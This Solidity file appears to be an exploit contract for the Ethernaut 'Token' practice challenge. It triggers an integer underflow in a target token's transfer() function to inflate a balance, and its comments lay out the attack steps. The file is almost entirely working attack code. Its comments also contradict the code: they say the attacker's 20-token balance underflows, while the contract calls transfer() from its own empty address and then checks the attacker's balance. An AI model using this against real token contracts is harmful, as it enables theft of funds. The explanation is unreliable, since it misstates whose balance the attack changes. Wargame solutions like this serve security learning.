// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @title TokenExploit
 * @notice Exploit contract for Ethernaut Level 5: Token
 * @dev Vulnerability: Integer underflow in transfer function
 * 
 * Attack Flow:
 * 1. Start with 20 tokens (given by the level)
 * 2. Call transfer() with _value > 20 (e.g., 21)
 * 3. The check `balances[msg.sender] - _value >= 0` underflows
 * 4. 20 - 21 underflows to 2^256 - 1 (max uint256)
 * 5. Balance becomes massive number (~infinite tokens)
 * 
 * The key vulnerability: Solidity 0.6 doesn't check for underflow
 * The require() check passes because underflow wraps to huge number
 */
contract TokenExploit {
    // Target contract interface
    IToken public target;
    
    // Attacker address
    address public attacker;
    
    constructor(address _target) public {
        target = IToken(_target);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the exploit
     * @dev Call transfer with amount > current balance to trigger underflow
     * Starting balance is 20, so we transfer 21 to cause underflow
     */
    function exploit() external {
        // Transfer more than we have to trigger underflow
        // This will give us ~infinite tokens
        target.transfer(address(0x1), 21);
    }
    
    /**
     * @notice Get current balance of attacker
     */
    function getMyBalance() external view returns (uint256) {
        return target.balanceOf(attacker);
    }
    
    /**
     * @notice Get balance of this contract
     */
    function getContractBalance() external view returns (uint256) {
        return target.balanceOf(address(this));
    }
}

/**
 * @title IToken
 * @notice Interface for the vulnerable Token contract
 */
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}
